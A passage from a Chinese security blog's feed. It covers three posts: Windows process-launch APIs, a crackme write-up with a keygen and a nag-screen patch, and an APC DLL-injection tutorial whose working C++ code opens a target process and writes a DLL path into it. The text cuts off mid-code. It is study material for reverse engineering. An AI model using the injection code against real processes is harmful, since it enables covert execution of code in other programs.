FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/1.png"></p><h5 id="ShellExecute函数"><a href="#ShellExecute函数" class="headerlink" title="ShellExecute函数"></a>ShellExecute函数</h5><p>对指定文件执行操作</p><figure class="highlight hsp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs hsp"><span class="hljs-keyword">HINSTANCE</span> ShellExecuteA(<br>  <span class="hljs-keyword">HWND</span>   <span class="hljs-keyword">hwnd</span>,<br>  LPCSTR lpOperation,<br>  LPCSTR lpFile,<br>  LPCSTR lpParameters,<br>  LPCSTR lpDirectory,<br>  <span class="hljs-keyword">INT</span>    nShowCmd<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。</p><p>lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有：</p><ul><li>edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。</li><li>explore：探索由lpFile指定的文件夹。</li><li>find：在由lpDirectory指定的目录中启动搜索。</li><li>open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。</li><li>print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。</li><li>NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。</li></ul><p>lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。</p><p>lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。</p><p>lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。</p><p>nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。</p><p>返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">HINSTANCE hInstance = ShellExecute(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;自己的文件路径&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, SW_NORMAL);<br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>)hInstance &lt;= <span class="hljs-number">32</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute创建失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute创建成功\n&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>运行程序提示创建成功，同时TestAPC被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/2.png"></p><h5 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h5><p>创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span>CreateProcess(<br>  LPCSTR                lpApplicationName,<br>  LPSTR                 lpCommandLine,<br>  LPSECURITY_ATTRIBUTES lpProcessAttributes,<br>  LPSECURITY_ATTRIBUTES lpThreadAttributes,<br>  <span class="hljs-keyword">BOOL </span>                 <span class="hljs-keyword">bInheritHandles,</span><br><span class="hljs-keyword"></span>  DWORD                 dwCreationFlags,<br>  LPVOID                lpEnvironment,<br>  LPCSTR                lpCurrentDirectory,<br>  LPSTARTUPINFOA        lpStartupInfo,<br>  LPPROCESS_INFORMATION lpProcessInformation<br>);<br></code></pre></div></td></tr></table></figure><p>lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。</p><p>lpCommandLine：要执行的命令行。</p><p>lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果<em>lpProcessAttributes</em>为NULL，则不能继承句柄。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果<em>lpThreadAttributes</em>为 NULL，则不能继承句柄。</p><p>bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。</p><p>dwCreationFlags：控制优先级类和进程创建的标志。</p><p>lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。</p><p>lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。</p><p>lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。</p><p>lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。</p><p>返回值：如果函数成功，则返回值非0；若失败，则返回值为0。</p><p>具体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi;<br>si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_NORMAL;<br>BOOL flag = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;自己的文件路径&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (flag) &#123;<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess创建成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess创建失败\n&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>运行之后，即可成功创建TestAPC进程。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-001</title>
    <link href="/2021/07/14/160CrackMe-001/"/>
    <url>/2021/07/14/160CrackMe-001/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。</p><p><img src="/2021/07/14/160CrackMe-001/1.png"></p><p>程序主题界面有两部分，第一部分是序列号加名字。</p><p><img src="/2021/07/14/160CrackMe-001/2.png"></p><p>第二部分是单纯的序列号，应该是比较简单。</p><p><img src="/2021/07/14/160CrackMe-001/3.png"></p><p>看完大体流程，开始分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。</p><p><img src="/2021/07/14/160CrackMe-001/4.png"></p><h5 id="先分析单纯的序列号。"><a href="#先分析单纯的序列号。" class="headerlink" title="先分析单纯的序列号。"></a>先分析单纯的序列号。</h5><p>用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。</p><p><img src="/2021/07/14/160CrackMe-001/5.png"></p><p>在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。</p><p><img src="/2021/07/14/160CrackMe-001/6.png"></p><p><img src="/2021/07/14/160CrackMe-001/7.png"></p><p>那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。</p><p><img src="/2021/07/14/160CrackMe-001/8.png"></p><h5 id="再来分析序列号加用户名"><a href="#再来分析序列号加用户名" class="headerlink" title="再来分析序列号加用户名"></a>再来分析序列号加用户名</h5><p>还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。</p><p><img src="/2021/07/14/160CrackMe-001/10.png"></p><p>首先是检测了输入的用户名长度，不可以小于4位。</p><p><img src="/2021/07/14/160CrackMe-001/9.png"></p><p>继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。</p><p><img src="/2021/07/14/160CrackMe-001/11.png"></p><p>数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。</p><p><img src="/2021/07/14/160CrackMe-001/12.png"></p><p>到这里整个过程就分析了，开始尝试编写注册机</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt; stdio.h &gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;corecrt_malloc.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> Name[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入大于四位的用户名\n&quot;</span>);<br>    gets_s(Name, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">int</span> Num;<br>    Num = (Name[<span class="hljs-number">0</span>] * <span class="hljs-number">0x29</span>) * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">char</span>* s1=<span class="hljs-string">&quot;CW&quot;</span>;<br>    <span class="hljs-keyword">char</span>* s2 = <span class="hljs-string">&quot;CRACKED&quot;</span>;<br>    <span class="hljs-keyword">char</span>* s3= <span class="hljs-string">&quot;-&quot;</span>;<br>    <span class="hljs-keyword">char</span>* serial = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">sprintf</span>(serial, <span class="hljs-string">&quot;%s%s%d%s%s&quot;</span>, s1, s3, Num, s3, s2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户名是：%s\nserial是：%s&quot;</span>, Name, serial);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输入用户名b1ackie，就可以计算出正确的serial。</p><p><img src="/2021/07/14/160CrackMe-001/13.png"></p><p>输入正确的值查看</p><p><img src="/2021/07/14/160CrackMe-001/14.png"></p><h4 id="弹窗的消除"><a href="#弹窗的消除" class="headerlink" title="弹窗的消除"></a>弹窗的消除</h4><p>先根据弹窗的提示信息，搜索字符串，可以定位到此处。</p><p><img src="/2021/07/14/160CrackMe-001/15.png"></p><p>执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。</p><p><img src="/2021/07/14/160CrackMe-001/16.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。</p><p>还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-APC注入</title>
    <link href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h5><p>将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  ULONG_PTR dwData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。</p><p>hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。</p><p>dwData：传递由pfnAPC参数指向的APC函数的单个值。</p><p>返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。</p><h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlconv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-function">DWORD <span class="hljs-title">GetPidByName</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName)</span> </span>&#123;<br>    HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    PROCESSENTRY32 PE32 = &#123; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PE32) &#125;;<br>    USES_CONVERSION;<br>    CString ProcessName = <span class="hljs-built_in">A2T</span>(pszProcessName);<br>    BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;PE32);<br>    <span class="hljs-keyword">while</span> (flag) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> PE32.th32ProcessID;<br>        &#125;<br>        flag = <span class="hljs-built_in">Process32Next</span>(hSnap, &amp;PE32);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">GetAllThreadIdByProcessId</span><span class="hljs-params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadIdLength = <span class="hljs-number">0</span>;<br>    DWORD dwBufferLength = <span class="hljs-number">1000</span>;<br>    THREADENTRY32 te32 = &#123; <span class="hljs-number">0</span> &#125;;<br>    HANDLE hSnapshot = <span class="hljs-literal">NULL</span>;<br>    BOOL bRet = TRUE;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">// 申请内存</span><br>        pThreadId = <span class="hljs-keyword">new</span> DWORD[dwBufferLength];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pThreadId)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(DWORD)));<br>        <span class="hljs-comment">// 获取线程快照</span><br>        <span class="hljs-built_in">RtlZeroMemory</span>(&amp;te32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32));<br>        te32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32);<br>        hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hSnapshot)<br>        &#123;<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取第一条线程快照信息</span><br>        bRet = <span class="hljs-built_in">Thread32First</span>(hSnapshot, &amp;te32);<br>        <span class="hljs-keyword">while</span> (bRet)<br>        &#123;<br>            <span class="hljs-comment">// 获取进程对应的线程ID</span><br>            <span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)<br>            &#123;<br>                pThreadId[dwThreadIdLength] = te32.th32ThreadID;<br>                dwThreadIdLength++;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历下一个线程快照信息</span><br>            bRet = <span class="hljs-built_in">Thread32Next</span>(hSnapshot, &amp;te32);<br>        &#125;<br>        <span class="hljs-comment">// 返回</span><br>        *ppThreadId = pThreadId;<br>        *pdwThreadIdLength = dwThreadIdLength;<br>        bRet = TRUE;<br><br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (FALSE == bRet)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pThreadId)<br>        &#123;<br>            <span class="hljs-keyword">delete</span>[]pThreadId;<br>            pThreadId = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">Inject</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName, <span class="hljs-keyword">char</span>* pszDllname)</span> </span>&#123;<br>    BOOL flag = FALSE;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadLength = <span class="hljs-number">0</span>;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    PVOID pBaseAddress = <span class="hljs-literal">NULL</span>;<br>    PVOID pLoadLibraryFunc = <span class="hljs-literal">NULL</span>;<br>    SIZE_T dwRet = <span class="hljs-number">0</span>, dwDllPathLen = <span class="hljs-built_in">strlen</span>(pszDllname) + <span class="hljs-number">1</span>;<br>    DWORD i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//获取进程的PID</span><br>        dwPID = <span class="hljs-built_in">GetPidByName</span>(pszProcessName);<br>        <span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取PID失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取所有线程ID</span><br>        flag = <span class="hljs-built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);<br>        <span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//打开进程</span><br>        hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>        <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//申请内存空间</span><br>        pBaseAddress = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>        <span class="hljs-keyword">if</span> (pBaseAddress == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请空间失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向申请的空间写入内存</span><br>        <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);<br>        <span class="hljs-keyword">if</span> (dwRet != dwDllPathLen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span 